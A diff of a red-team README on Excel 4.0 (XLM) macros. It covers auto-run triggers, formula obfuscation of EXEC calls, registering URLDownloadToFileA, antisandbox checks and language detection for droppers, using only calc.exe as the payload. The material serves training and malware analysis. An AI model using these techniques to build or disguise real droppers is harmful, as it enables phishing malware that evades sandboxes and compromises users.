@@ -4,9 +4,17 @@ This list is for anyone wishing to learn about Excel4.0/XLM for Red Team but do 
 
 Based on: [The first step in Excel 4.0 for Red Team](https://blog.stmcyber.com/excel-4-0-for-red-team/)
 ## Table of Contents
-1. [Hello calc.exe!](#-hello-calc.exe-!)
-2. [Using WinAPI](#-using-winapi)
-## [↑](#-table-of-contents) Hello calc.exe !
+1. [Creating Excel 4.0 macro](#-creating-excel-4.0-macro)
+2. [Obfuscation](#-obfuscation)
+3. [Using WinAPI](#-using-winapi)
+4. [Antisandbox techniques](#-antisandbox-techniques)
+5. [Detecting language](#-detecting-language)
+6. [Running system commands](#-running-system-commands)
+7. [Defining variable](#-defining-variable)
+8. [Defining function](#-defining-function)
+9. [Redirecting execution](#-redirecting-execution)
+10. [Other resources](#-other-resources)
+## [↑](#table-of-contents) Creating Excel 4.0 macro
 Let's start by creating a simple macro to run the calculator:
 1. Run Excel and create new workbook.
 2. Right click "Sheet1" in the bottom of your screen and click "Insert".
@@ -26,7 +34,7 @@ There are two fundamentals trigger functions: Auto_Open and Auto_Close. In order
 
 One interesting thing is that you can obfuscate the Auto_Open and Auto_Close functions by adding random characters to their end e.g. the Auto_OpenTEST function will execute when you open Excel just like Auto_Open. Moreover, these functions are case-insensitive so you can use AuTo_OpEn.
 
-## Obfuscation techniques
+## [↑](#table-of-contents) Obfuscation
 There are a lot of obfuscation techniques such as xor, addition, subtraction, division, multiplication, substring etc. Of course, you can mix these techniques. Let's take a closer look at them and try to obfuscate EXEC("calc.exe") call.
 But first let me introduce some basic functions:
 - CHAR(number) - returns the character specified by a number;
@@ -94,7 +102,6 @@ Example: (paste it in R2C1 cell)
 ```
 ![ob_int_1](/assets/ob_int_1.PNG)
 
-
 ### Execution environment
 Excel 4.0 provides a lot of formulas which return information about execution environment. This technique could be also used as Antisandbox technique. Often the sandbox will have a different execution environment, so the values returned by these functions will be different.
 
@@ -121,11 +128,8 @@ Put it in R1C1
 =FORMULA(R11C1, R13C1)
 ```
 
-
-## Other obfuscation tricks
 ### Adding noise
 Malware authors often add noise to the worksheet by inserting random values in cells.
-
 
 ### Multiple calls in one cell
 Excel 4.0 allows to define multiple variables and call multiple formulas in one single cell.
@@ -214,7 +218,7 @@ URLDownloadToFileA
 =REGISTER("urlmon", "URLDownloadToFileA", "JJCCJJ", "URLDownloadToFileA", , 1, 9)
 ```
 
-## Antisandbox techniques
+## [↑](#table-of-contents) Antisandbox techniques
 Here are some techniques used by droppers in phishing campaigns. If you analyze a malicious macro, it will save you time searching Excel 4.0 documentation.
 
 - Check the time elapsed between the execution of the formulas. If someone analyzes the instructions step by step manually, the execution time of the formulas will be longer.
@@ -272,14 +276,14 @@ R10C1 and R1C1 are references to NOW() formula output. Put your code between NOW
 =IF(GET.WORKBOOK(16)<>"test.xlsm",CLOSE(TRUE),)
 ```
 
-## Language independent dropper
+## [↑](#table-of-contents) Detecting language
 One of the problems when writing macros in excel 4.0 is the language settings in Excel. If your national language is not English, you will probably also have a problem with it, where your clients have Excel, e.g. in Polish. Excel automatically translates the formulas to another language, but if you obfuscate some malicious formulas, they will not be translated. So when writing droppers, you will probably have to consider the two languages: English and your native language. You can use the following function to detect the language: INDEX(GET.WORKSPACE(37),1). This function returns number corresponding to the country version of Microsoft Excel. For example 48 is Polish.
 
 ```
 =IF(INDEX(GET.WORKSPACE(37),1)<>48,GOTO(ADDRESS_1),GOTO(ADDRESS_2))
 ```
 
-## Exec method
+## [↑](#table-of-contents) Running system commands
 You can use EXEC method to run your cmd with arguments:
 ```
 =EXEC("C:\Windows\system32\cmd.exe /c calc.exe")
@@ -297,7 +301,7 @@ In this example cmd.exe will run, then the window will be changed to cmd.exe. Th
 =APP.ACTIVATE(, FALSE)
 ```
 
-## Defining variables
+## [↑](#table-of-contents) Defining variable
 You can define a variable with the SET.NAME function.
 SET.NAME(name_text, value) where,
 - name_text - name that refers to value;
@@ -321,7 +325,7 @@ An alternative way to define a variable is to write: name = value in the cell.
 cmd="calc.exe"
 =EXEC(cmd)
 ```
-## Defining function
+## [↑](#table-of-contents) Defining function
 You can call your macro as function by defining variable pointing to start of your macro. At the end of your macro add RETURN formula.
 
 RETURN(value) - ends the currently running macro and returns control to the formula that called the custom function.
@@ -351,7 +355,7 @@ Put it at R1C5
 =RETURN
 ```
 
-## Redirect execution
+## [↑](#table-of-contents) Redirecting execution
 ### ERROR
 By using ERROR call you can call your macro if an error is encountered while a macro is running.
 Syntax:
@@ -384,7 +388,7 @@ Put it in R1C1
 Put it in R1C2
 =EXEC("calc.exe")
 ```
-## Other resources
+## [↑](#table-of-contents) Other resources
 [Old school: evil Excel 4.0 macros (XLM) by Stan Hegt](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
 
 [Evolution of Excel 4.0 Macro Weaponization by JAMES HAUGHOM AND STEFANO ORTOLANI](https://www.lastline.com/labsblog/evolution-of-excel-4-0-macro-weaponization/)
